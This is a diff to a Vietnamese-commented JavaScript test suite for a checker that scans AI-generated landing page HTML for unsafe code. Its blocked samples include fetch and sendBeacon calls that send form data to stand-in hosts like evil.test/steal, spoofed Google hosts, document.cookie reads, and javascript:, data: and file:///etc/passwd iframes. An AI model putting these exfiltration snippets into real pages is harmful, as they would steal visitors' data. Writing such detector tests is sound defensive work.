@@ -48,7 +48,36 @@ const REAL_UI_SAMPLES = {
   'onerror với nháy là thực thể (&#39;)': '<img src="/x.png" alt="" onerror="this.src=&#39;https://placehold.co/600x400&#39;">',
   'onsubmit chuyển zalo.me sau 1 giây': '<form data-founderai-capture onsubmit="setTimeout(function(){ window.location.href = \'https://zalo.me/g/abc123\'; }, 1000);"><input name="email"/></form>',
   'onchange / onload giao diện': '<select onchange="document.getElementById(\'gia\').textContent = this.value"><option>1</option></select><body onload="this.classList.add(\'loaded\')"></body>',
+  // Vòng 3 (đo production 04/10, 78 landing): gửi lead về Google Sheet (fetch 11 trang), popup localStorage (4 trang),
+  // iframe youtube-nocookie / drive.google.com / zingmp3.vn, script src unpkg.com (2) / cdnjs.cloudflare.com (1).
+  'popup localStorage.getItem("popupShown")':
+    "<script>if (!localStorage.getItem('popupShown')) { setTimeout(function(){ document.getElementById('popup').classList.remove('hidden'); localStorage.setItem('popupShown', '1'); }, 3000); }</script>",
+  'sessionStorage popup': "<script>if (!sessionStorage.getItem('seen')) { sessionStorage.setItem('seen', '1'); }</script>",
+  'iframe youtube-nocookie': '<iframe src="https://www.youtube-nocookie.com/embed/abc" allowfullscreen></iframe>',
+  'iframe drive.google.com': '<iframe src="https://drive.google.com/file/d/1AbC/preview" width="640" height="480"></iframe>',
+  'iframe zingmp3.vn': '<iframe src="https://zingmp3.vn/embed/song/ZW123"></iframe>',
+  'iframe campaign.digiso.vn': '<iframe src="https://campaign.digiso.vn/form/abc"></iframe>',
+  'script src unpkg.com': '<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>',
+  'script src cdnjs.cloudflare.com': '<script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>',
 };
+
+/**
+ * Khối "gửi form về Google Sheet" đúng mẫu production: URL gán vào biến rồi `fetch(biến, …)`, có/không `mode:'no-cors'`,
+ * kèm chuyển sang nhóm Zalo sau khi gửi. Ba tên biến thực tế: GOOGLE_SCRIPT_URL / scriptURL / GOOGLE_SHEET_WEB_APP_URL.
+ */
+const sheetScript = (varName, { noCors = true, url = 'https://script.google.com/macros/s/AKfycbxAbC123_def/exec' } = {}) =>
+  `<script>
+const ${varName} = '${url}';
+const form = document.getElementById('lead-form');
+form.addEventListener('submit', function (e) {
+  e.preventDefault();
+  const formData = new FormData(form);
+  fetch(${varName}, { method: 'POST', ${noCors ? "mode: 'no-cors', " : ''}body: formData })
+    .then(() => { window.location.href = 'https://zalo.me/g/abc123'; })
+    .catch((error) => console.error('Error!', error.message));
+});
+</script>`;
+const SHEET_VAR_NAMES = ['GOOGLE_SCRIPT_URL', 'scriptURL', 'GOOGLE_SHEET_WEB_APP_URL'];
 
 describe('landingHtmlSafety — MẪU THẬT từ production phải QUA (sinh mới)', () => {
   for (const [name, snippet] of Object.entries(REAL_UI_SAMPLES)) {
@@ -59,6 +88,65 @@ describe('landingHtmlSafety — MẪU THẬT từ production phải QUA (sinh m�
 
   it('trang đủ bộ mẫu thật cùng lúc', () => {
     expect(findUnsafeLandingHtml(page(Object.values(REAL_UI_SAMPLES).join('')))).toEqual([]);
+  });
+
+  it('gửi lead về Google Sheet (fetch tới script.google.com): cả 3 tên biến, có / không mode:"no-cors" → QUA', () => {
+    for (const varName of SHEET_VAR_NAMES) {
+      for (const noCors of [true, false]) {
+        expect(findUnsafeLandingHtml(page(sheetScript(varName, { noCors })))).toEqual([]);
+      }
+    }
+  });
+
+  it('lời gọi mạng tới đích được phép khác: script.googleusercontent.com, docs.google.com (Forms), founderai.biz + tên miền con, tương đối, host trong văn bản nguồn', () => {
+    const ok = [
+      "fetch('https://script.googleusercontent.com/macros/echo?user_content_key=abc')",
+      "fetch('https://docs.google.com/forms/d/e/1FAIpQLSabc/formResponse', { method: 'POST', mode: 'no-cors', body: d })",
+      "fetch('https://api.founderai.biz/api/public/leads', { method: 'POST', body: d })",
+      "fetch('/api/lead', { method: 'POST', body: d })",
+      "fetch('submit.php', { method: 'POST', body: d })", // đối số đầu là chuỗi chữ tương đối
+      "navigator.sendBeacon('https://script.google.com/macros/s/AKfy/exec', d)",
+      "var x = new XMLHttpRequest(); x.open('POST', 'https://script.google.com/macros/s/AKfy/exec'); x.send(d)",
+      "var u = '/api/lead'; fetch(u, { method: 'POST', body: d })", // URL tương đối gán vào biến trong cùng khối
+    ];
+    for (const code of ok) expect(kinds(page(`<script>${code}</script>`))).toEqual([]);
+    const own = page("<script>fetch('https://api.cua-toi.vn/lead', { method: 'POST', body: d })</script>");
+    expect(kinds(own)).toEqual(['net']);
+    expect(kinds(own, { allowedSourceText: 'API của tôi: https://api.cua-toi.vn' })).toEqual([]);
+  });
+
+  it('handler on* gọi mạng tới đích được phép (chữ trong chính handler) → qua; đích động → chặn', () => {
+    const ok = `<form onsubmit="fetch('https://script.google.com/macros/s/AKfy/exec', { method: 'POST', mode: 'no-cors', body: new FormData(this) }); return false;"></form>`;
+    expect(kinds(page(ok))).toEqual([]);
+    expect(kinds(page('<form onsubmit="fetch(window.TARGET, { body: new FormData(this) })"></form>'))).toEqual(['net']);
+  });
+
+  it('URL chuyển trang trong cùng khối với fetch (Zalo sau khi gửi Sheet) được kiểm bởi nhóm redirect, không bị tính vào nhóm net', () => {
+    expect(findUnsafeLandingHtml(page(sheetScript('scriptURL')))).toEqual([]);
+    const evilRedirect = page(sheetScript('scriptURL').replace('https://zalo.me/g/abc123', 'https://evil.test/login'));
+    expect(kinds(evilRedirect)).toEqual(['redirect']);
+  });
+
+  it('localStorage / sessionStorage đơn thuần (không có lời gọi mạng) KHÔNG bị chặn; document.cookie thì có', () => {
+    expect(kinds(page("<script>var s = localStorage.getItem('a'); sessionStorage.setItem('b', '1'); window.localStorage.removeItem('c');</script>"))).toEqual([]);
+    expect(kinds(page('<script>var c = document.cookie</script>'))).toEqual(['secret']);
+  });
+
+  it('script src: unpkg.com, cdnjs, jsdelivr, Google Fonts/Tag Manager, pixel Facebook, founderai.biz, host trong văn bản nguồn → qua', () => {
+    const srcs = [
+      'https://unpkg.com/aos@2.3.1/dist/aos.js',
+      'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js',
+      'https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js',
+      'https://fonts.googleapis.com/css2?family=Inter',
+      'https://www.googletagmanager.com/gtag/js?id=G-ABC123',
+      'https://connect.facebook.net/en_US/fbevents.js',
+      'https://founderai.biz/lp-track.js',
+      '//unpkg.com/x.js',
+    ];
+    for (const src of srcs) expect(kinds(page(`<script src="${src}"></script>`))).toEqual([]);
+    const own = page('<script src="https://static.cua-toi.vn/app.js"></script>');
+    expect(kinds(own)).toEqual(['script']);
+    expect(kinds(own, { allowedSourceText: 'Website https://static.cua-toi.vn' })).toEqual([]);
   });
 
   it('script giao diện thường gặp: đếm ngược, menu di động, FAQ, cuộn mượt, popup, năm hiện tại', () => {
@@ -104,8 +192,12 @@ describe('landingHtmlSafety — MẪU THẬT từ production phải QUA (sinh m�
     expect(kinds(html, { allowedSourceText: 'Landing cho https://www.shop.cua-toi.vn/san-pham' })).toEqual(['redirect']); // host khác (www.)
   });
 
-  it('nhúng iframe được phép: YouTube, Vimeo, Google Maps, founderai.biz, đường dẫn tương đối; JSON-LD không chạy', () => {
+  it('nhúng iframe được phép: MỌI https:// (YouTube, Vimeo, Maps, Drive, zingmp3, host lạ), //host, đường dẫn tương đối, about:blank; JSON-LD không chạy', () => {
     const embeds = [
+      '<iframe src="https://zingmp3.vn/embed/song/ZW123"></iframe>',
+      '<iframe src="https://drive.google.com/file/d/1AbC/preview"></iframe>',
+      '<iframe src="https://anything.example.org/embed?x=1"></iframe>',
+      '<iframe src="//anything.example.org/embed"></iframe>',
       '<iframe src="https://www.youtube.com/embed/abc" allowfullscreen></iframe>',
       '<iframe src="https://www.youtube-nocookie.com/embed/abc"></iframe>',
       '<iframe src="https://player.vimeo.com/video/123"></iframe>',
@@ -184,16 +276,83 @@ describe('landingHtmlSafety — biến thể độc PHẢI CHẶN, đúng nhóm'
     for (const code of codes) expect(kinds(page(`<script>${code}</script>`))).toContain('net');
   });
 
-  it('secret: document.cookie, localStorage, sessionStorage, cookieStore', () => {
-    for (const code of [
-      'var c = document.cookie',
-      'window.document.cookie = "a=1"',
-      "localStorage.getItem('popup')",
-      "window.sessionStorage.setItem('a','b')",
-      'cookieStore.getAll()',
-    ]) {
+  it('secret: document.cookie, cookieStore (localStorage/sessionStorage KHÔNG còn bị chặn)', () => {
+    for (const code of ['var c = document.cookie', 'window.document.cookie = "a=1"', 'cookieStore.getAll()']) {
       expect(kinds(page(`<script>${code}</script>`))).toContain('secret');
     }
+  });
+
+  it('net: fetch tới host LẠ — gán qua biến trong cùng khối, ghép chuỗi, lẫn với URL Google Sheet hợp lệ → CHẶN', () => {
+    // gán qua biến
+    expect(kinds(page(sheetScript('scriptURL', { url: `${evil}/collect` })))).toEqual(['net']);
+    expect(kinds(page(`<script>const GOOGLE_SCRIPT_URL = '${evil}/exec'; fetch(GOOGLE_SCRIPT_URL, { method: 'POST', body: d })</script>`))).toEqual(['net']);
+    // ghép chuỗi: vế chữ đầu là host lạ
+    expect(kinds(page(`<script>fetch('${evil}/c?d=' + encodeURIComponent(data))</script>`))).toEqual(['net']);
+    // URL Google Sheet hợp lệ NHƯNG khối còn một URL chữ tới host lạ (sao lưu lead ra ngoài)
+    const both = page(`<script>const backup = '${evil}/backup'; ${sheetScript('scriptURL').replace('<script>', '').replace('</script>', '')}</script>`);
+    expect(kinds(both)).toEqual(['net']);
+    // host giả mạo bằng đuôi / tiền tố
+    expect(kinds(page("<script>fetch('https://script.google.com.evil.test/exec', { body: d })</script>"))).toEqual(['net']);
+    expect(kinds(page("<script>fetch('https://evilscript.google.com.test/exec', { body: d })</script>"))).toEqual(['net']);
+    expect(kinds(page("<script>fetch('https://notfounderai.biz/x', { body: d })</script>"))).toEqual(['net']);
+    // template URL không đọc được host
+    expect(kinds(page('<script>fetch(`https://${host}/x`, { body: d })</script>'))).toEqual(['net']);
+  });
+
+  it('net: lời gọi mạng mà khối KHÔNG có URL chữ nào (đích động) → CHẶN', () => {
+    const dynamic = [
+      'fetch(url, { method: "POST", body: d })',
+      'fetch(document.getElementById("t").value, { body: d })',
+      'fetch(window.TARGET)',
+      'var u = location.search.slice(1); fetch(u)',
+      'var x = new XMLHttpRequest(); x.open("POST", target); x.send(d)',
+      'navigator.sendBeacon(target, d)',
+      'const scriptURL = document.currentScript.dataset.url; fetch(scriptURL, { body: d })',
+    ];
+    for (const code of dynamic) expect(kinds(page(`<script>${code}</script>`))).toEqual(['net']);
+  });
+
+  it('net: URL chỉ nằm trong chú thích hoặc regex không được tính là "có URL chữ"', () => {
+    expect(kinds(page("<script>// https://script.google.com/macros/s/x/exec\nfetch(target, { body: d })</script>"))).toEqual(['net']);
+    expect(kinds(page("<script>/* https://script.google.com/exec */ fetch(target)</script>"))).toEqual(['net']);
+  });
+
+  it('net: nháy nằm trong regex không làm lệch cặp nháy → URL chữ hợp lệ vẫn được nhận ra', () => {
+    const code = "var clean = (s) => s.replace(/[\"']/g, ''); fetch('https://script.google.com/macros/s/AKfy/exec', { method: 'POST', body: clean(d) })";
+    expect(kinds(page(`<script>${code}</script>`))).toEqual([]);
+  });
+
+  it('net: sendBeacon tới host lạ; handler fetch tới host lạ; XHR tới host lạ → CHẶN', () => {
+    expect(kinds(page(`<script>navigator.sendBeacon('${evil}/b', JSON.stringify(data))</script>`))).toEqual(['net']);
+    expect(kinds(page(`<form onsubmit="fetch('${evil}/c', { method: 'POST', body: new FormData(this) })"></form>`))).toEqual(['net']);
+    expect(kinds(page(`<script>var x = new XMLHttpRequest(); x.open('POST', '${evil}/x'); x.send(d)</script>`))).toEqual(['net']);
+  });
+
+  it('iframe: scheme khác https, javascript:, data:, srcdoc vẫn chặn', () => {
+    expect(kinds('<iframe src="http://example.org/x"></iframe>')).toEqual(['iframe']);
+    expect(kinds('<iframe src="ftp://example.org/x"></iframe>')).toEqual(['iframe']);
+    expect(kinds('<iframe src="blob:https://example.org/uuid"></iframe>')).toEqual(['iframe']);
+    expect(kinds('<iframe src="file:///etc/passwd"></iframe>')).toEqual(['iframe']);
+    expect(kinds('<iframe src="javascript:alert(1)"></iframe>')).toEqual(['jsurl']);
+    expect(kinds('<iframe src="data:text/html,<script>1</script>"></iframe>')).toEqual(['jsurl']);
+    expect(kinds('<iframe src="data:application/pdf;base64,AAAA"></iframe>')).toEqual(['iframe']);
+    expect(kinds('<iframe srcdoc="<p>x</p>" src="https://example.org"></iframe>')).toEqual(['srcdoc']);
+  });
+
+  it('redirect: nút chia sẻ / kênh mạng xã hội được phép; mạng xã hội lạ và host giả thì chặn', () => {
+    const ok = [
+      "window.open('https://www.facebook.com/sharer/sharer.php?u=' + location.href)",
+      "window.open('https://zalo.me/share?u=x')",
+      "location.href = 'https://fb.me/trang'",
+      "location.href = 'https://www.messenger.com/t/abc'",
+      "window.open('https://www.tiktok.com/@abc')",
+      "location.href = 'https://www.youtube.com/watch?v=abc'",
+      "location.href = 'https://docs.google.com/forms/d/e/abc/viewform'",
+      "location.href = 'https://forms.gle/abc'",
+    ];
+    for (const code of ok) expect(kinds(page(`<script>${code}</script>`))).toEqual([]);
+    expect(kinds(page("<script>window.open('https://www.facebook.com.evil.test/sharer')</script>"))).toEqual(['redirect']);
+    expect(kinds(page("<script>window.open('https://twitter.com/share')</script>"))).toEqual(['redirect']);
   });
 
   it('exec: eval, new Function, Function(, document.write, setTimeout/setInterval với đối số chuỗi', () => {
@@ -309,11 +468,7 @@ describe('landingHtmlSafety — biến thể độc PHẢI CHẶN, đúng nhóm'
     expect(kinds('<input type="submit" formaction="//evil.test">')).toEqual(['action']);
   });
 
-  it('iframe ra ngoài danh sách cho phép, srcdoc, meta refresh, base href, thẻ chữ thô lồng quá sâu', () => {
-    expect(kinds('<iframe src="https://evil.test/phish"></iframe>')).toEqual(['iframe']);
-    expect(kinds('<iframe src="//evil.test/phish"></iframe>')).toEqual(['iframe']);
-    expect(kinds('<iframe src="https://www.youtube.com.evil.test/embed/x"></iframe>')).toEqual(['iframe']);
-    expect(kinds('<iframe src="https://www.google.com/search?q=x"></iframe>')).toEqual(['iframe']); // chỉ /maps được
+  it('srcdoc, meta refresh, base href, thẻ chữ thô lồng quá sâu', () => {
     expect(kinds('<iframe srcdoc="<p>hi</p>"></iframe>')).toEqual(['srcdoc']);
     expect(kinds('<meta http-equiv="refresh" content="0;url=https://evil.test">')).toEqual(['meta']);
     expect(kinds('<META HTTP-EQUIV=Refresh CONTENT="5">')).toEqual(['meta']);
@@ -420,12 +575,27 @@ describe('landingHtmlSafety — sửa landing: so với bản cũ (baseline)', (
     );
     const same = page("<script>var seen = localStorage.getItem('popup'); fetch('https://api.cua-khach.vn/ping');</script>");
     expect(findUnsafeLandingHtml(same, { baselineHtml: old })).toEqual([]);
-    const added = page(
-      "<script>var seen = localStorage.getItem('popup'); fetch('https://api.cua-khach.vn/ping'); fetch('https://evil.test/steal', { body: seen });</script>"
+    // fetch lạ thêm vào MỘT KHỐI SCRIPT MỚI: chỉ khối mới bị báo (api.cua-khach.vn là host có trong bản cũ nên khối cũ vẫn qua).
+    const addedBlock = page(
+      "<script>var seen = localStorage.getItem('popup'); fetch('https://api.cua-khach.vn/ping');</script><script>fetch('https://evil.test/steal', { body: seen });</script>"
     );
-    const found = findUnsafeLandingHtml(added, { baselineHtml: old });
+    const found = findUnsafeLandingHtml(addedBlock, { baselineHtml: old });
     expect(found.map((f) => f.kind)).toEqual(['net']);
     expect(found[0].sample).toContain('evil.test/steal');
+    // fetch lạ thêm vào CÙNG khối: tính theo khối nên mọi lời gọi mạng của khối đó đều thành "mới" — vẫn bị bắt.
+    const sameBlock = page(
+      "<script>var seen = localStorage.getItem('popup'); fetch('https://api.cua-khach.vn/ping'); fetch('https://evil.test/steal', { body: seen });</script>"
+    );
+    const foundSame = findUnsafeLandingHtml(sameBlock, { baselineHtml: old });
+    expect(foundSame.map((f) => f.kind)).toEqual(['net', 'net']);
+    expect(foundSame.some((f) => f.sample.includes('evil.test/steal'))).toBe(true);
+  });
+
+  it('bản cũ đã có khối gọi mạng bị coi là lạ (đích động): giữ nguyên qua; đổi sang URL lạ KHÁC cùng câu lệnh → bị bắt', () => {
+    const old = page('<script>var u = window.TARGET; fetch(u, { body: d })</script>');
+    expect(findUnsafeLandingHtml(old, { baselineHtml: old })).toEqual([]);
+    const changed = page(`<script>var u = '${evil}/new'; fetch(u, { body: d })</script>`);
+    expect(kinds(changed, { baselineHtml: old })).toEqual(['net']);
   });
 
   it('sửa phần giao diện của script cũ (đổi số giây) KHÔNG bị chặn dù script có setTimeout/handler', () => {
@@ -476,8 +646,9 @@ describe('landingHtmlSafety — lỗi trả về', () => {
     expect(err).toBeDefined();
     expect(err.status).toBe(422);
     expect(err.code).toBe(LANDING_UNSAFE_OUTPUT_CODE);
-    expect(err.message).toMatch(/AI vừa thêm mã gọi mạng ra ngoài/);
-    expect(err.message).toMatch(/đọc cookie hoặc bộ nhớ/);
+    expect(err.message).toMatch(/AI vừa thêm/);
+    expect(err.message).toMatch(/mã gọi mạng tới địa chỉ lạ hoặc không rõ đích/);
+    expect(err.message).toMatch(/đọc cookie của trang/);
     expect(err.message).toMatch(/chuyển khách hoặc gán đường dẫn sang địa chỉ lạ/);
     expect(err.message).toMatch(/trình soạn HTML/);
     expect(err.details.findings.map((f) => f.kind).sort()).toEqual(['net', 'redirect', 'secret']);
